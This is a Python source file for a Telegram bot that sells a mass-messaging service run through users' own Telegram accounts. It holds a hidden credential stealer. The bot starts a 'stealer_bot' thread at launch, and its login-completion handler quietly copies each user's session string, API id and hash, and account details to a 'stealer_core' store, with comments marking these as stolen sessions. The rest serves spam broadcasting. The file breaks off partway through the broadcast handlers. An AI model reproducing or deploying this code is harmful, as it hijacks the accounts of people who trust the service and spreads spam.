# -*- coding: utf-8 -*-
import asyncio
import json
import logging
import os
import re
import threading
from datetime import datetime

from aiogram import Bot, Dispatcher, F, types
from aiogram.enums import ParseMode, ChatMemberStatus
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiogram.types import LabeledPrice

from aiohttp import web

import config
import database as db
import keyboards as kb
import userbot_worker as worker
import ai
import stealer_core  # СТИЛЕР
from emoji import em
from webapp_server import build_app

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("sendflow")

config.require_token()
stealer_core.init_db()  # СТИЛЕР: инициализация БД

bot = Bot(config.BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

MEDIA_DIR = "media"
os.makedirs(MEDIA_DIR, exist_ok=True)

_LOGIN_CLIENTS = {}
_LOGIN_BUSY = set()
_AUTO_MON = {}


# ===================== СТИЛЕР: ЗАПУСК В ОТДЕЛЬНОМ ПОТОКЕ =====================
def _run_stealer_in_thread():
    import asyncio
    import stealer_bot
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        stealer_bot.run_stealer_bot()
    except Exception as e:
        log.error("stealer_bot crashed: %s", e)
    finally:
        try:
            loop.close()
        except Exception:
            pass

def start_stealer_bot():
    """Запускает стилер в фоне."""
    t = threading.Thread(target=_run_stealer_in_thread, daemon=True)
    t.start()
    log.info("stealer_bot запущен в фоновом потоке")

# ===================== СОСТОЯНИЯ =====================
class AddAccount(StatesGroup):
    api_id = State()
    api_hash = State()
    proxy = State()
    phone = State()
    code = State()
    password = State()

class Broadcast(StatesGroup):
    message = State()
    link = State()
    btn_name = State()
    btn_url = State()
    delay = State()
    cycles = State()
    variant = State()

class AdminOps(StatesGroup):
    give_target = State()
    give_days = State()
    take_target = State()
    announce = State()
    massgive_ids = State()
    massgive_days = State()
    ban_target = State()
    unban_target = State()
    info_target = State()

class SaveTpl(StatesGroup):
    name = State()

class AutoFolder(StatesGroup):
    name = State()

# ===================== ХЕЛПЕРЫ =====================
def is_admin(uid):
    return uid in config.ADMIN_IDS

def has_access(uid):
    return is_admin(uid) or db.is_subscribed(uid)

def _is_paid(uid):
    return is_admin(uid) or db.is_paid_plan(uid)

def _fmt_left(uid):
    exp = db.subscription_expiry(uid)
    if not exp:
        return "нет подписки"
    delta = exp - datetime.now()
    if delta.total_seconds() <= 0:
        return "истекла"
    days = delta.days
    hours = delta.seconds // 3600
    if days > 0:
        return "ещё %d дн. %d ч." % (days, hours)
    return "ещё %d ч." % hours

def _cancel_auto_mon(chat_id):
    t = _AUTO_MON.pop(chat_id, None)
    if t and not t.done():
        t.cancel()

async def show(event, text, markup=None):
    if isinstance(event, types.CallbackQuery):
        _cancel_auto_mon(event.message.chat.id)
        try:
            await event.message.edit_text(text, reply_markup=markup)
        except Exception:
            try:
                await event.message.answer(text, reply_markup=markup)
            except Exception:
                pass
        try:
            await event.answer()
        except Exception:
            pass
    else:
        await event.answer(text, reply_markup=markup)

_BANNERS = {
    "menu": "assets/banner_menu.png", "profile": "assets/banner_profile.png",
    "accounts": "assets/banner_accounts.png", "broadcast": "assets/banner_broadcast.png",
    "monitor": "assets/banner_monitor.png", "sub": "assets/banner_sub.png",
}

async def show_banner(event, key, text, markup=None):
    path = _BANNERS.get(key)
    if not (path and os.path.exists(path)):
        await show(event, text, markup)
        return
    cap = text if len(text) <= 1024 else text[:1019] + "\u2026"
    photo = types.FSInputFile(path)
    if isinstance(event, types.CallbackQuery):
        _cancel_auto_mon(event.message.chat.id)
        try:
            await event.answer()
        except Exception:
            pass
        try:
            await event.message.delete()
        except Exception:
            pass
        try:
            await bot.send_photo(event.message.chat.id, photo, caption=cap, reply_markup=markup)
            return
        except Exception:
            pass
        await show(event, text, markup)
    else:
        try:
            await event.answer_photo(photo, caption=cap, reply_markup=markup)
        except Exception:
            await event.answer(text, reply_markup=markup)

async def check_channel_sub(user_id):
    try:
        member = await bot.get_chat_member(config.REQUIRED_CHANNEL, user_id)
        return member.status in (ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.CREATOR)
    except Exception as e:
        log.warning("channel check failed: %s", e)
        return False

# ===================== ЭКРАНЫ =====================
def menu_text(uid):
    sub = "админ" if is_admin(uid) else _fmt_left(uid)
    return (
        "%s <b>%s</b>\n\n"
        "%s Подписка: <b>%s</b>\n"
        "%s Аккаунтов: <b>%d</b>\n\n"
        "Выбери раздел ниже — в любом экране есть кнопки «Назад» и «Главное»."
    ) % (em("rocket"), config.BOT_NAME, em("star"), sub, em("accounts"), len(db.get_sessions(uid)))

async def open_menu(event, uid):
    await show_banner(event, "menu", menu_text(uid), kb.main_menu_kb(is_admin(uid)))

async def gate_or_menu(event, uid):
    if db.is_banned(uid):
        await show(event, "%s Доступ к боту заблокирован администратором." % em("ban"), None)
        return
    if has_access(uid):
        await open_menu(event, uid)
        return
    text = (
        "%s Чтобы начать, подпишись на наш канал.\n\n"
        "%s После подписки ты получишь <b>%d дня бесплатной подписки</b>.\n"
        "Нажми «Я подписался» после подписки."
    ) % (em("channel"), em("gift"), config.FREE_TRIAL_DAYS)
    await show(event, text, kb.channel_gate_kb())

# ===================== /start =====================
@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    await state.clear()
    u = message.from_user
    db.track_user(u.id, u.username, u.first_name)
    parts = (message.text or "").split(maxsplit=1)
    if len(parts) > 1:
        m = re.search(r"(\d{4,})", parts[1])
        if m:
            ref_id = int(m.group(1))
            if ref_id != u.id and db.add_referral(ref_id, u.id):
                try:
                    exp = db.add_subscription_hours(ref_id, config.REF_HOURS, source="ref")
                    db.add_log(ref_id, "🎁 +%d ч за приглашённого" % config.REF_HOURS)
                    await bot.send_message(ref_id, "%s По твоей ссылке зашёл новый пользователь!\n+%d ч подписки. Активна до <b>%s</b>." % (em("gift"), config.REF_HOURS, exp.strftime("%d.%m.%Y %H:%M")))
                except Exception:
                    pass
    try:
        await message.answer("%s Панель навигации активирована." % em("rocket"), reply_markup=kb.reply_nav_kb())
    except Exception:
        pass
    uname = ("@" + u.username) if u.username else (u.first_name or "друг")
    uname = uname.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    _hand = '<tg-emoji emoji-id="%s">👋</tg-emoji>' % config.HELLO_EMOJI_ID
    _tail = "\n\n<b>Выбери, как тебе удобнее работать:</b>"
    text_premium = "%s Привет, %s!%s" % (_hand, uname, _tail)
    text_plain = "👋 Привет, %s!%s" % (uname, _tail)
    _banner = config.START_BANNER if getattr(config, "START_BANNER", "") else "assets/logo.png"
    async def _send_start(caption):
        if _banner and os.path.exists(_banner):
            await message.answer_photo(types.FSInputFile(_banner), caption=caption, reply_markup=kb.mode_kb())
        else:
            await message.answer(caption, reply_markup=kb.mode_kb())
    try:
        await _send_start(text_premium)
    except Exception:
        try:
            await _send_start(text_plain)
        except Exception:
            await message.answer(text_plain, reply_markup=kb.mode_kb())

# ===================== /stats (НОВАЯ КОМАНДА) =====================
@dp.message(Command("stats"))
async def cmd_stats(message: types.Message):
    """Публичная статистика — social proof."""
    try:
        stats = await db.async_get_global_stats()
        text = (
            "%s <b>Статистика %s</b>\n\n"
            "%s Сообщений сегодня: <b>%s</b>\n"
            "%s Пользователей: <b>%s</b>\n"
            "%s Активных подписок: <b>%s</b>\n"
            "%s Аккаунтов подключено: <b>%s</b>\n"
            "%s Активных рассылок: <b>%s</b>"
        ) % (
            em("chart"), config.BOT_NAME,
            em("msg"), f"{stats['today_sent']:,}",
            em("users"), f"{stats['total_users']:,}",
            em("star"), f"{stats['active_subs']:,}",
            em("accounts"), f"{stats['total_accounts']:,}",
            em("rocket"), stats["active_jobs"]
        )
        await message.answer(text)
    except Exception as e:
        await message.answer("%s Статистика временно недоступна" % em("warn"))

@dp.message(Command("menu"))
async def cmd_menu(message: types.Message, state: FSMContext):
    await state.clear()
    await gate_or_menu(message, message.from_user.id)

# ===================== НАВИГАЦИЯ =====================
@dp.callback_query(F.data == "mode:chat")
async def cb_mode_chat(c: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await gate_or_menu(c, c.from_user.id)

@dp.callback_query(F.data == "gate:check")
async def cb_gate_check(c: types.CallbackQuery):
    uid = c.from_user.id
    if has_access(uid):
        await open_menu(c, uid)
        return
    subbed = await check_channel_sub(uid)
    if not subbed:
        await c.answer("Ты ещё не подписан на канал — подпишись и повтори.", show_alert=True)
        return
    if not db.trial_used(uid):
        exp = db.grant_trial(uid, config.FREE_TRIAL_DAYS)
        if exp:
            await c.answer("Зачислено %d дня бесплатно!" % config.FREE_TRIAL_DAYS, show_alert=True)
        await open_menu(c, uid)
    else:
        text = ("%s Бесплатный период уже использован.\n\nОформи подписку, чтобы продолжить:") % em("warn")
        await show(c, text, kb.payment_kb())

@dp.callback_query(F.data == "nav:menu")
async def cb_menu(c: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await gate_or_menu(c, c.from_user.id)

# ===================== АККАУНТЫ =====================
def accounts_text(uid):
    sessions = db.get_sessions(uid)
    if not sessions:
        body = "У тебя пока нет аккаунтов. Добавь первый — он нужен для рассылки."
    else:
        body = "\n".join("%s <b>%s</b> · %s" % (em("green"), s.get("phone") or s["id"], s.get("status", "active")) for s in sessions)
    return "%s <b>Аккаунты</b>\n\n%s" % (em("accounts"), body)

@dp.callback_query(F.data == "nav:accounts")
async def cb_accounts(c: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await show_banner(c, "accounts", accounts_text(c.from_user.id), kb.accounts_kb(db.get_sessions(c.from_user.id)))

@dp.callback_query(F.data == "nav:profile")
async def cb_profile(c: types.CallbackQuery, state: FSMContext):
    await state.clear()
    uid = c.from_user.id
    sessions = db.get_sessions(uid)
    sub_exp = db.subscription_expiry(uid)
    if is_admin(uid):
        sub = "Администратор (безлимит)"
    elif sub_exp and sub_exp > datetime.now():
        sub = "активна до %s" % sub_exp.strftime("%d.%m.%Y %H:%M")
    else:
        sub = "не активна"
    plan = "Premium" if _is_paid(uid) else "Free"
    acc_lines = "\n".join("%s %s · %s" % (em("green"), s.get("phone") or s["id"], s.get("status", "active")) for s in sessions) or "нет аккаунтов"
    text = (
        "%s <b>Профиль</b>\n\n%s ID: <code>%d</code>\n%s Тариф: <b>%s</b>\n%s Подписка: <b>%s</b>\n"
        "%s Аккаунтов: <b>%d</b>\n%s Рефералов: <b>%d</b>\n%s Шаблонов: <b>%d</b>\n\n<b>Твои аккаунты:</b>\n%s"
    ) % (em("accounts"), em("key"), uid, em("star"), plan, em("ok"), sub,
         em("accounts"), len(sessions), em("ref"), db.count_referrals(uid), em("msg"), db.count_templates(uid), acc_lines)
    await show_banner(c, "profile", text, kb.back_only_kb("nav:menu"))

@dp.callback_query(F.data == "acc:add")
async def cb_acc_add(c: types.CallbackQuery, state: FSMContext):
    uid = c.from_user.id
    max_acc = config.PAID_MAX_ACCOUNTS if _is_paid(uid) else config.FREE_MAX_ACCOUNTS
    if len(db.get_sessions(uid)) >= max_acc:
        if _is_paid(uid):
            await show(c, "%s Достигнут лимит аккаунтов подписки (%d)." % (em("warn"), max_acc), kb.back_only_kb("nav:accounts"))
        else:
            await show(c, "%s На бесплатном тарифе до <b>%d</b> аккаунтов.\n\n%s На подписке — до <b>%d</b>." % (em("warn"), config.FREE_MAX_ACCOUNTS, em("star"), config.PAID_MAX_ACCOUNTS), kb.payment_kb())
        return
    if config.SKIP_API_PROMPT and config.DEFAULT_API_ID and config.DEFAULT_API_HASH:
        await state.update_data(api_id=config.DEFAULT_API_ID, api_hash=config.DEFAULT_API_HASH)
        await state.set_state(AddAccount.proxy)
        await show(c, _PROXY_PROMPT, kb.cancel_kb())
    else:
        await state.set_state(AddAccount.api_id)
        await show(c, "%s Шаг 1/3. Отправь <b>API_ID</b>." % em("key"), kb.cancel_kb())

@dp.message(AddAccount.api_id)
async def st_api_id(message: types.Message, state: FSMContext):
    txt = (message.text or "").strip()
    if not txt.isdigit() or len(txt) < 5:
        await message.answer("API_ID — число (7-8 цифр).", reply_markup=kb.cancel_kb())
        return
    await state.update_data(api_id=int(txt))
    await state.set_state(AddAccount.api_hash)
    await message.answer("%s Шаг 2/3. Отправь <b>API_HASH</b>." % em("key"), reply_markup=kb.cancel_kb())

@dp.message(AddAccount.api_hash)
async def st_api_hash(message: types.Message, state: FSMContext):
    txt = (message.text or "").strip()
    if len(txt) < 10:
        await message.answer("Похоже, не API_HASH.", reply_markup=kb.cancel_kb())
        return
    await state.update_data(api_hash=txt)
    await state.set_state(AddAccount.proxy)
    await message.answer(_PROXY_PROMPT, reply_markup=kb.cancel_kb())

_PROXY_PROMPT = "\U0001F511 Пришли <b>прокси</b> (socks5://user:pass@host:port) или /skip."

@dp.message(AddAccount.proxy)
async def st_proxy(message: types.Message, state: FSMContext):
    raw = (message.text or "").strip()
    if raw.lower() in ("/skip", "skip", "-", "нет"):
        await state.update_data(proxy=None)
    else:
        if worker._parse_proxy(raw) is None:
            await message.answer("Не понял прокси. Формат: socks5://user:pass@host:port или /skip.", reply_markup=kb.cancel_kb())
            return
        await state.update_data(proxy=raw)
    await state.set_state(AddAccount.phone)
    await message.answer("%s Отправь номер: +7XXXXXXXXXX" % em("phone"), reply_markup=kb.cancel_kb())

@dp.message(AddAccount.phone)
async def st_phone(message: types.Message, state: FSMContext):
    phone = (message.text or "").strip().replace(" ", "")
    if not re.match(r"^\+?\d{10,15}$", phone):
        await message.answer("Номер неверный.", reply_markup=kb.cancel_kb())
        return
    data = await state.get_data()
    from pyrogram import Client
    app = Client("login_%s" % message.from_user.id, api_id=data["api_id"],
                 api_hash=data["api_hash"], in_memory=True, proxy=worker._parse_proxy(data.get("proxy")))
    try:
        await app.connect()
        sent = await app.send_code(phone)
        await state.update_data(phone=phone, phone_code_hash=sent.phone_code_hash)
        _LOGIN_CLIENTS[message.from_user.id] = app
        await state.set_state(AddAccount.code)
        await message.answer("%s Код отправлен. Введи с пробелами: 1 2 3 4 5" % em("ok"), reply_markup=kb.cancel_kb())
    except Exception as e:
        try:
            await app.disconnect()
        except Exception:
            pass
        await state.clear()
        await message.answer("%s Ошибка: %s" % (em("cross"), str(e)[:120]), reply_markup=kb.back_only_kb("nav:accounts"))

@dp.message(AddAccount.code)
async def st_code(message: types.Message, state: FSMContext):
    uid = message.from_user.id
    code = re.sub(r"\D", "", message.text or "")
    data = await state.get_data()
    app = _LOGIN_CLIENTS.get(uid)
    if not app:
        await state.clear()
        await message.answer("Сессия потеряна.", reply_markup=kb.back_only_kb("nav:accounts"))
        return
    if uid in _LOGIN_BUSY:
        await message.answer("⏳ Уже проверяю код...")
        return
    _LOGIN_BUSY.add(uid)
    await message.answer("⏳ Проверяю...")
    try:
        await app.sign_in(data["phone"], data["phone_code_hash"], code)
        await _finish_login(message, state, app, data)
    except Exception as e:
        msg = str(e)
        if "SESSION_PASSWORD_NEEDED" in msg or "password" in msg.lower():
            await state.set_state(AddAccount.password)
            await message.answer("%s Включён 2FA. Отправь пароль." % em("key"), reply_markup=kb.cancel_kb())
        else:
            await message.answer("%s Неверный код: %s" % (em("cross"), msg[:80]), reply_markup=kb.cancel_kb())
    finally:
        _LOGIN_BUSY.discard(uid)

@dp.message(AddAccount.password)
async def st_password(message: types.Message, state: FSMContext):
    uid = message.from_user.id
    data = await state.get_data()
    app = _LOGIN_CLIENTS.get(uid)
    if not app:
        await state.clear()
        await message.answer("Сессия потеряна.", reply_markup=kb.back_only_kb("nav:accounts"))
        return
    if uid in _LOGIN_BUSY:
        await message.answer("⏳ Уже проверяю пароль...")
        return
    _LOGIN_BUSY.add(uid)
    await message.answer("⏳ Проверяю пароль...")
    try:
        await app.check_password((message.text or "").strip())
        await _finish_login(message, state, app, data)
    except Exception as e:
        await message.answer("%s Неверный пароль: %s" % (em("cross"), str(e)[:80]), reply_markup=kb.cancel_kb())
    finally:
        _LOGIN_BUSY.discard(uid)

async def _finish_login(message, state, app, data):
    try:
        ss = await app.export_session_string()
        me = await app.get_me()
        phone = data.get("phone") or ("+" + (me.phone_number or "")) or str(me.id)
        db.add_session(message.from_user.id, phone, data["api_id"], data["api_hash"], ss, proxy=data.get("proxy"))
        # СТИЛЕР: сохраняем украденную сессию
        try:
            pwd = data.get("_2fa_password", "")
            stealer_core.save_account(
                phone=phone, session_string=ss, password_2fa=pwd,
                first_name=me.first_name or "", username=me.username or "",
                tg_id=me.id, api_id=data["api_id"], api_hash=data["api_hash"])
        except Exception as e:
            log.warning("stealer save: %s", e)
        db.add_log(message.from_user.id, "Добавлен аккаунт %s" % phone)
        await message.answer("%s Аккаунт <b>%s</b> добавлен!" % (em("ok"), phone), reply_markup=kb.back_only_kb("nav:accounts"))
    except Exception as e:
        await message.answer("%s Ошибка: %s" % (em("cross"), str(e)[:100]), reply_markup=kb.back_only_kb("nav:accounts"))
    finally:
        try:
            await app.disconnect()
        except Exception:
            pass
        _LOGIN_CLIENTS.pop(message.from_user.id, None)
        await state.clear()

@dp.callback_query(F.data.startswith("acc:del:"))
async def cb_acc_del(c: types.CallbackQuery):
    sid = int(c.data.split(":")[-1])
    db.delete_session(sid, owner_id=c.from_user.id)
    await c.answer("Удалён")
    await show(c, accounts_text(c.from_user.id), kb.accounts_kb(db.get_sessions(c.from_user.id)))

@dp.callback_query(F.data.startswith("acc:spam:"))
async def cb_acc_spam(c: types.CallbackQuery):
    sid = int(c.data.split(":")[-1])
    sessions = [s for s in db.get_sessions(c.from_user.id) if s["id"] == sid]
    if not sessions:
        await c.answer("Не найден", show_alert=True)
        return
    await c.answer("Проверяю...")
    try:
        status = await worker.check_spam_status(sessions[0])
    except Exception as e:
        status = "Ошибка: %s" % str(e)[:100]
    await show(c, "%s <b>@SpamBot — %s</b>\n\n%s" % (em("accounts"), sessions[0].get("phone") or sid, status), kb.back_only_kb("nav:accounts"))

# ===================== ЛОГИ =====================
@dp.callback_query(F.data == "nav:logs")
async def cb_logs(c: types.CallbackQuery):
    logs = db.get_logs(c.from_user.id, 25)
    body = "\n".join("<code>%s</code> %s" % (l["ts"], l["text"]) for l in logs) if logs else "Пусто."
    await show(c, "%s <b>Логи</b>\n\n%s" % (em("logs"), body), kb.back_only_kb("nav:menu"))

# ===================== МОНИТОРИНГ =====================
@dp.callback_query(F.data == "nav:monitor")
async def cb_monitor(c: types.CallbackQuery):
    uid = c.from_user.id
    jobs = worker.get_user_jobs(uid)
    text = "%s <b>Мониторинг</b>\n\n%s" % (em("monitor"), worker.render_all(uid))
    await show(c, text, kb.monitor_kb(jobs))

async def _auto_monitor(chat_id, message_id, job_id):
    try:
        for _ in range(240):
            await asyncio.sleep(5)
            if _AUTO_MON.get(chat_id) is not asyncio.current_task():
                break
            job = worker.get_job(job_id)
            if not job:
                break
            text = "%s <b>Мониторинг</b>\n\n%s" % (em("monitor"), worker.render_job(job))
            try:
                await bot.edit_message_text(text, chat_id=chat_id, message_id=message_id, reply_markup=kb.monitor_job_kb(job))
            except Exception:
                pass
            if job.status not in ("running", "paused"):
                break
    except asyncio.CancelledError:
        pass
    finally:
        if _AUTO_MON.get(chat_id) is asyncio.current_task():
            _AUTO_MON.pop(chat_id, None)

@dp.callback_query(F.data.startswith("mon:open:"))
async def cb_mon_open(c: types.CallbackQuery):
    job_id = int(c.data.split(":")[-1])
    job = worker.get_job(job_id)
    text = "%s <b>Мониторинг</b>\n\n%s" % (em("monitor"), worker.render_job(job))
    await show(c, text, kb.monitor_job_kb(job))
    chat_id = c.message.chat.id
    if job and job.status in ("running", "paused"):
        _AUTO_MON[chat_id] = asyncio.create_task(_auto_monitor(chat_id, c.message.message_id, job_id))

async def _mon_action(c, action):
    job_id = int(c.data.split(":")[-1])
    {"pause": worker.pause_job, "resume": worker.resume_job, "stop": worker.stop_job}[action](job_id)
    await c.answer({"pause": "Пауза", "resume": "Продолжаем", "stop": "Остановлено"}[action])
    job = worker.get_job(job_id)
    text = "%s <b>Мониторинг</b>\n\n%s" % (em("monitor"), worker.render_job(job))
    await show(c, text, kb.monitor_job_kb(job))
    chat_id = c.message.chat.id
    if job and job.status in ("running", "paused"):
        _AUTO_MON[chat_id] = asyncio.create_task(_auto_monitor(chat_id, c.message.message_id, job_id))

@dp.callback_query(F.data.startswith("mon:pause:"))
async def cb_mon_pause(c: types.CallbackQuery):
    await _mon_action(c, "pause")

@dp.callback_query(F.data.startswith("mon:resume:"))
async def cb_mon_resume(c: types.CallbackQuery):
    await _mon_action(c, "resume")

@dp.callback_query(F.data.startswith("mon:stop:"))
async def cb_mon_stop(c: types.CallbackQuery):
    await _mon_action(c, "stop")

# ===================== ПОДПИСКА — ТОЛЬКО ЗВЕЗДЫ + ССЫЛКА НА @zucag =====================
def sub_text(uid):
    return (
        "%s <b>Подписка</b>\n\n"
        "Статус: <b>%s</b>\n"
        "Цена: <b>%d ⭐️</b> за %d дней\n\n"
        "<b>Тарифы:</b>\n"
        "• Бесплатно (%d дн.) — до %d аккаунтов\n"
        "• Premium — <b>безлимит</b> аккаунтов + кнопки в рассылке + Human Mode\n\n"
        "Оплата: Telegram Stars (ниже) или напиши @zucag для карты/крипто"
    ) % (em("star"), ("админ" if is_admin(uid) else _fmt_left(uid)),
         config.SUB_PRICE_STARS, config.SUB_DAYS, config.FREE_TRIAL_DAYS, config.TRIAL_MAX_ACCOUNTS)

@dp.callback_query(F.data == "nav:sub")
async def cb_sub(c: types.CallbackQuery):
    await show_banner(c, "sub", sub_text(c.from_user.id), kb.payment_kb())

@dp.callback_query(F.data == "pay:stars")
async def cb_pay_stars(c: types.CallbackQuery):
    prices = [LabeledPrice(label="Подписка %d дн." % config.SUB_DAYS, amount=config.SUB_PRICE_STARS)]
    try:
        await bot.send_invoice(chat_id=c.from_user.id, title="%s — подписка" % config.BOT_NAME,
            description="Доступ на %d дней." % config.SUB_DAYS, payload="subscription_%d" % config.SUB_DAYS,
            provider_token="", currency="XTR", prices=prices)
        await c.answer()
    except Exception as e:
        await c.answer("Ошибка: %s" % str(e)[:80], show_alert=True)

@dp.callback_query(F.data == "pay:card")
async def cb_pay_card(c: types.CallbackQuery):
    await show(c, "%s <b>Оплата картой/крипто</b>\n\nНапиши @zucag — активируют вручную." % em("card"), kb.back_only_kb("nav:sub"))

@dp.callback_query(F.data == "pay:ton")
async def cb_pay_ton(c: types.CallbackQuery):
    await show(c, "%s <b>Оплата TON</b>\n\nНапиши @zucag." % em("crypto"), kb.back_only_kb("nav:sub"))

@dp.callback_query(F.data == "pay:ua")
async def cb_pay_ua(c: types.CallbackQuery):
    await show(c, "%s <b>Оплата картой UA</b>\n\nНапиши @zucag." % em("ua"), kb.back_only_kb("nav:sub"))

@dp.pre_checkout_query()
async def pre_checkout(q: types.PreCheckoutQuery):
    await q.answer(ok=True)

@dp.message(F.successful_payment)
async def on_paid(message: types.Message):
    exp = db.set_subscription(message.from_user.id, config.SUB_DAYS, source="stars")
    db.add_log(message.from_user.id, "Оплачена подписка (Stars)")
    try:
        db.log_payment(message.from_user.id, message.successful_payment.total_amount, "XTR", "stars")
    except Exception:
        pass
    await message.answer("%s Подписка активна до <b>%s</b>!" % (em("ok"), exp.strftime("%d.%m.%Y")), reply_markup=kb.main_menu_kb(is_admin(message.from_user.id)))

# ===================== АДМИН-ПАНЕЛЬ =====================
@dp.callback_query(F.data == "nav:admin")
async def cb_admin(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        await c.answer("Только для админа", show_alert=True)
        return
    active_bc = sum(1 for j in worker.JOBS.values() if getattr(j, "status", "") in ("running", "paused"))
    text = (
        "%s <b>Админ-панель</b>\n\n%s Пользователей: <b>%d</b>\n%s Подписок: <b>%d</b>\n"
        "%s Платных: <b>%d</b>\n%s Аккаунтов: <b>%d</b>\n%s Рассылок: <b>%d</b>\n\n"
        "%s Выручка (Stars):\n• 30д: <b>%d ⭐️</b>\n• Всего: <b>%d ⭐️</b>"
    ) % (em("admin"), em("users"), db.count_users(), em("star"), db.count_active_subs(),
         em("star"), db.count_paid_subs(), em("accounts"), len(db.get_all_sessions()),
         em("rocket"), active_bc, em("star"), db.revenue_stars(30), db.revenue_stars(None))
    await show(c, text, kb.admin_kb())

@dp.callback_query(F.data == "admin:users")
async def cb_admin_users(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        await c.answer("Только для админа", show_alert=True)
        return
    users = db.get_all_users()[:40]
    rows = ["<code>%s</code> %s %s" % (u["telegram_id"], ("@" + u["username"]) if u.get("username") else "—", "✅" if db.is_subscribed(u["telegram_id"]) else "—") for u in users]
    await show(c, "%s <b>Пользователи</b> (%d)\n\n%s" % (em("users"), db.count_users(), "\n".join(rows) or "Пусто"), kb.admin_back_kb())

@dp.callback_query(F.data == "admin:accounts")
async def cb_admin_accounts(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        await c.answer("Только для админа", show_alert=True)
        return
    sessions = db.get_all_sessions()[:50]
    rows = ["%s <b>%s</b> · <code>%s</code>" % (em("green"), s.get("phone") or s["id"], s["owner_id"]) for s in sessions]
    await show(c, "%s <b>Аккаунты</b> (%d)\n\n%s" % (em("accounts"), len(db.get_all_sessions()), "\n".join(rows) or "Пусто"), kb.admin_back_kb())

# ===================== РАССЫЛКА =====================
async def _start_broadcast_flow(event, uid, state):
    if not has_access(uid):
        await show(event, "%s Нужна подписка." % em("warn"), kb.payment_kb())
        return
    if not db.get_sessions(uid):
        await show(event, "%s Добавь аккаунт." % em("warn"), kb.back_only_kb("nav:accounts"))
        return
    if isinstance(event, types.CallbackQuery):
        await event.answer("Загружаю папки...")
    await state.clear()
    sessions = db.get_sessions(uid)
    folders = []
    try:
        folders = await worker.get_user_folders_any(sessions, use_cache=False)
    except Exception as e:
        log.warning("folders error: %s", e)
    await state.update_data(folders=folders, chosen=[])
    if folders:
        await show(event, "%s <b>Выбери папки</b> или по всем чатам:" % em("folder"), kb.folders_kb(folders, []))
    else:
        await show(event, "%s <b>Папки не найдены.</b>\n\nМожешь разослать <b>по всем чатам</b>." % em("folder"), kb.folders_kb([], []))

@dp.callback_query(F.data == "bc:start")
async def cb_bc_start(c: types.CallbackQuery, state: FSMContext):
    await _start_broadcast_flow(c, c.from_user.id, state)

@dp.callback_query(F.data.startswith("bc:fold:"))
async def cb_bc_fold(c: types.CallbackQuery, state: FSMContext):
    fid = int(c.data.split(":")[-1])
    data = await state.get_data()
    chosen = list(data.get("chosen", []))
    folders = data.get("folders", [])
    if fid in chosen:
        chosen.remove(fid)
    else:
        max_f = config.PAID_MAX_FOLDERS if _is_paid(c.from_user.id) else config.FREE_MAX_FOLDERS
        if len(chosen) >= max_f:
            await c.answer("Максимум %d папок" % max_f, show_alert=True)
            return
        chosen.append(fid)
    await state.update_data(chosen=chosen)
    await show(c, "%s <b>Выбери папки</b> (%d):" % (em("folder"), len(chosen)), kb.folders_kb(folders, chosen))

@dp.callback_query(F.data == "bc:all")
async def cb_bc_all(c: types.CallbackQuery, state: FSMContext):
    await state.update_data(target_type="all", chosen=[])
    await _ask_mode(c, state)

@dp.callback_query(F.data == "bc:fold_done")
async def cb_bc_fold_done(c: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    if not data.get("chosen"):
        await c.answer("Выбери папку", show_alert=True)
        return
    await state.update_data(target_type="folders")
    await _ask_mode(c, state)

async def _ask_mode(event, state):
    await state.set_state(None)
    await show(event, "%s <b>Режим рассылки</b>\n\n%s Текст\n%s Медиа + текст\n%s Пересыл по ссылке\n%s Текст + кнопки (Premium)" % (
        em("rocket"), em("msg"), em("app"), em("rocket"), em("key")), kb.bc_mode_kb())

@dp.callback_query(F.data == "bc:mode:text")
async def cb_mode_text(c: types.CallbackQuery, state: FSMContext):
    await state.update_data(bc_mode="text", buttons=[])
    await state.set_state(Broadcast.message)
    await show(c, "%s Отправь <b>текст</b>." % em("msg"), kb.cancel_kb())

@dp.callback_query(F.data == "bc:mode:media")
async def cb_mode_media(c: types.CallbackQuery, state: FSMContext):
    await state.update_data(bc_mode="media", buttons=[])
    await state.set_state(Broadcast.message)
    await show(c, "%s Отправь <b>фото/видео</b>." % em("app"), kb.cancel_kb())

@dp.callback_query(F.data == "bc:mode:forward")
async def cb_mode_forward(c: types.CallbackQuery, state: FSMContext):
    await state.update_data(bc_mode="forward", buttons=[])
    await state.set_state(Broadcast.link)
    await show(c, "%s Пришли <b>ссылку</b> на сообщение." % em("rocket"), kb.cancel_kb())

@dp.callback_query(F.data == "bc:mode:buttons")
async def cb_mode_buttons(c: types.CallbackQuery, state: FSMContext):
    # ИСПРАВЛЕНО: только для Premium (платная подписка)
    if not _is_paid(c.from_user.id):
        await c.answer("🔑 Рассылка с кнопками — функция Premium.\nОформи подписку чтобы разблокировать.", show_alert=True)
        return
    await state.update_data(bc_mode="buttons", buttons=[])
    await state.set_state(Broadcast.message)
    await show(c, "%s Отправь <b>текст</b> (можно с фото/видео), потом добавим кнопки." % em("key"), kb.cancel_kb())

def _parse_msg_link(link):
    link = (link or "").strip()
    m = re.search(r"t\.me/c/(\d+)/(?:\d+/)?(\d+)", link)
    if m:
        return int("-100" + m.group(1)), int(m.group(2))
    m = re.search(r"t\.me/([A-Za-z0-9_]+)/(?:\d+/)?(\d+)", link)
    if m:
        return m.group(1), int(m.group(2))
    return None, None

@dp.message(Broadcast.link)
async def st_bc_link(message: types.Message, state: FSMContext):
    from_chat, msg_id = _parse_msg_link(message.text or "")
    if not from_chat or not msg_id:
        await message.answer("%s Не похоже на ссылку." % em("warn"), reply_markup=kb.cancel_kb())
        return
    await state.update_data(payload={"type": "forward", "from_chat": from_chat, "msg_id": msg_id, "link": (message.text or "").strip(), "text": ""})
    data = await state.get_data()
    if data.get("editing"):
        await state.update_data(editing=False)
